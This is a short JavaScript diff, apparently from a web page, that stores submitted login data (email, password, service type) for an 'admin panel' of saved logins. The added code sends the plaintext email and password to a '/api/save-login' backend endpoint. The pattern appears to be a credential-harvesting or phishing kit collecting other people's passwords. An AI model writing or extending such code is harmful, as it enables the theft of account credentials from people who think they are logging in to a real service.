@@ -687,11 +687,30 @@
                 timestamp: new Date().toLocaleString(),
                 id: Date.now()
             };
+            
+            // Save to memory (for local admin panel)
             savedLogins.push(loginData);
-            console.log('✅ Data saved successfully:', loginData);
-            console.log('📊 Total saved logins:', savedLogins.length);
-            console.log('💾 All data:', savedLogins);
             updateDataDisplay();
+            
+            // Send to backend API
+            fetch('/api/save-login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    type: type
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Data saved to server:', data);
+            })
+            .catch(error => {
+                console.error('❌ Error saving to server:', error);
+            });
         }
 
         function updateDataDisplay() {
